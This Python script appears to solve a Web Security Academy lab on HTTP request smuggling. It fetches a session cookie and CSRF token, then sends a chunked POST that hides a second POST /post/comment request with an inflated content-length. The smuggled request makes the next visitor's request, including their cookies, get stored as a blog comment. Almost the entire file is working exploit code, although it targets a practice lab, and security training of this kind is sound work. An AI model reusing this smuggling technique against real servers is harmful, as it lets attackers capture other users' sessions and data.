import re
import time
import urllib.parse
import http.client
import ssl

LAB_ID = "???"

postId=7

def GET_post() -> http.client.HTTPResponse:
    method, path = 'GET', '/post'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('postId', postId),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def smuggle_post_comment(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'transfer-encoding': 'chunked',
    }
    smuggled = f"""POST /post/comment HTTP/1.1
content-length: 880
content-type: application/x-www-form-urlencoded
cookie: session={session}

postId={postId}&name=fjasduifh&email=fasdgad%40fadsf.com&website=https%3A%2F%2Ffasdfasdf.com&csrf={csrf}&comment=""" \
        .replace("\n", "\r\n")
    body = f"0\r\n\r\n{smuggled}"
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def post_csrf() -> tuple[str, str]:
    response = GET_post()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


session, csrf = post_csrf()
response = smuggle_post_comment(session, csrf)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
print()
print(response.read().decode())
print()
